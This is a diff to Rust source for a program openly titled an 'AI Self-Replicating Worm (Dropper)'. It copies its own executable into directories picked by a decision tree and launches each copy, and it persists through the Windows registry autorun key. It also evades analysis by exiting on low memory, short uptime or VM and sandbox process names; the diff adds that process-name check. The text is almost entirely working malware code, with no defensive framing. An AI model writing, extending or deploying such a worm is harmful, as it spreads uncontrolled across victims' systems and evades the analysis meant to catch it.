@@ -4,10 +4,11 @@ use std::path::Path;
 use walkdir::WalkDir;
 use winreg::enums::*;
 use winreg::RegKey;
-use sysinfo::{System, SystemExt};
+use sysinfo::{ProcessExt, System, SystemExt};
 use num_cpus;
 use linfa::prelude::*;
 use linfa_trees::DecisionTree;
+use ndarray::{Array1, Array2};
 
 #[derive(Parser)]
 #[command(name = "AI Self-Replicating Worm (Dropper)")]
@@ -24,6 +25,10 @@ struct Args {
     /// Add to autorun
     #[arg(long)]
     autorun: bool,
+
+    /// Enable verbose logging
+    #[arg(long)]
+    verbose: bool,
 }
 
 fn get_own_binary() -> Option<Vec<u8>> {
@@ -41,6 +46,14 @@ fn is_in_sandbox() -> bool {
     let total_memory = sys.total_memory() / 1024 / 1024;
     if total_memory < 2048 {
         return true;
+    }
+    // Check for suspicious processes
+    let processes = sys.processes();
+    for (_pid, process) in processes {
+        let name = process.name().to_lowercase();
+        if name.contains("sandbox") || name.contains("vmware") || name.contains("virtualbox") || name.contains("qemu") {
+            return true;
+        }
     }
     // Check uptime (seconds)
     if sys.uptime() < 300 { // Less than 5 minutes
@@ -82,14 +95,14 @@ fn add_to_autorun() {
                 println!("[-] Failed to convert exe path to string");
             }
         } else {
-            println!("[-] Failed to get current exe path");
+            println!("[-] Failed to get exe path");
         }
     } else {
-        println!("[-] Failed to open registry key for autorun");
+        println!("[-] Failed to get exe path");
     }
 }
 
-fn ai_decide_to_drop(file_count: f32, depth: f32) -> bool {
+fn ai_decide_to_drop(file_count: f32, depth: f32, verbose: bool) -> bool {
     // Generate realistic training data based on typical directory structures
     let mut features = Vec::new();
     let mut labels = Vec::new();
@@ -100,24 +113,28 @@ fn ai_decide_to_drop(file_count: f32, depth: f32) -> bool {
         let d = (i % 5) as f32 + rand::random::<f32>() * 3.0; // 0-8 depth
         let should_drop = fc > 10.0 && d > 2.0; // Realistic rule: drop if crowded and deep
         features.push(vec![fc, d]);
-        labels.push(if should_drop { 1.0 } else { 0.0 });
+        labels.push(if should_drop { 1 } else { 0 });
     }
 
-    let features_array = Array2::from_shape_vec((features.len(), 2), features.into_iter().flatten().collect()).unwrap();
+    let num_samples = features.len();
+    let features_array = Array2::from_shape_vec((num_samples, 2), features.into_iter().flatten().collect()).unwrap();
     let labels_array = Array1::from_vec(labels);
 
     let dataset = Dataset::new(features_array, labels_array);
+    if verbose {
+        println!("Training with {} samples", num_samples);
+    }
     let model = DecisionTree::params().fit(&dataset).unwrap();
 
     let input = Array2::from_shape_vec((1, 2), vec![file_count, depth]).unwrap();
     let prediction = model.predict(&input);
-    let decision = prediction[0] > 0.5;
+    let decision = prediction[0] == 1;
 
     println!("[AI] Directory has {} files, depth {}, deciding to {}", file_count, depth, if decision { "drop" } else { "skip" });
     decision
 }
 
-fn drop_and_spawn_to_directory(target_dir: &Path, binary: &[u8]) {
+fn drop_and_spawn_to_directory(target_dir: &Path, binary: &[u8], verbose: bool) {
     let mut rng = rand::thread_rng();
     let random_name = format!("worm_{}.exe", rng.gen_range(1000..10000));
     let target_path = target_dir.join(random_name);
@@ -130,11 +147,13 @@ fn drop_and_spawn_to_directory(target_dir: &Path, binary: &[u8]) {
             println!("[-] Failed to spawn process");
         }
     } else {
-        println!("[-] Failed to drop executable to: {:?}", target_path);
+        if verbose {
+            println!("[-] Failed to drop executable to: {:?}", target_path);
+        }
     }
 }
 
-fn scan_and_spread() {
+fn scan_and_spread(verbose: bool) {
     if let Some(my_binary) = get_own_binary() {
         let current_dir = std::env::current_dir().unwrap_or_else(|_| Path::new(".").to_path_buf());
         println!("[*] AI Worm (Dropper) started at: {:?}", current_dir);
@@ -145,12 +164,14 @@ fn scan_and_spread() {
                 entries.push(entry);
             }
         }
-
-        for entry in entries {
+        for entry in &entries {
+            if verbose {
+                println!("Scanning directory: {:?}", entry.path());
+            }
             let dir_name = entry.file_name().to_str().unwrap_or("");
             let depth = entry.depth();
-            if !["__pycache__", "System", "Windows"].contains(&dir_name) && ai_decide_to_drop(entries.len() as f32, depth as f32) {
-                drop_and_spawn_to_directory(entry.path(), &my_binary);
+            if !["__pycache__", "System", "Windows"].contains(&dir_name) && ai_decide_to_drop(entries.len() as f32, depth as f32, verbose) {
+                drop_and_spawn_to_directory(entry.path(), &my_binary, verbose);
             }
         }
     } else {
@@ -167,11 +188,12 @@ fn print_banner() {
 
 fn main() {
     print_banner();
+    let args = Args::parse();
+    let verbose = args.verbose;
     if is_in_sandbox() {
         println!("[-] Detected sandbox environment. Exiting.");
         return;
     }
-    let args = Args::parse();
     let run_all = !args.scan && !args.hide && !args.autorun;
 
     if args.hide || run_all {
@@ -181,6 +203,6 @@ fn main() {
         add_to_autorun();
     }
     if args.scan || run_all {
-        scan_and_spread();
+        scan_and_spread(verbose);
     }
 }
